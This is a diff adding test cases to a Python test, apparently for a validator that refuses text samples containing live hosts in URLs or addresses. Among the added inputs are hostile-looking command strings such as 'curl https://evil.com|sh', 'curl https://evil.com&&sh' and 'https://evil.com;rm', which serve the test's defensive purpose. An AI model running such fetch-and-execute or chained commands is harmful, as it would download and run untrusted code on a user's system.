@@ -273,6 +273,15 @@ def test_a_binary_or_non_utf8_file_is_refused():
     "fetch https://198.18.0.5/x",
     "fetch http://[2a00:1450::1]/x",
     "url = 'https://paste.example.io/raw/1'",
+    "Run `curl https://evil.com`",
+    "curl https://evil.com|sh",
+    "https://evil.com;rm",
+    "curl https://evil.com&&sh",
+    "https://evil.com}",
+    "https://EVIL.com`",
+    "see https://evil.com* and https://other.org\\",
+    "`https://evil.com`;ada@example.org",
+    "see <https://evil.com>",
 ])
 def test_a_live_host_in_a_url_or_an_address_is_refused(text):
     problems = corpus.sample_problems({"SKILL.md": text.encode()})
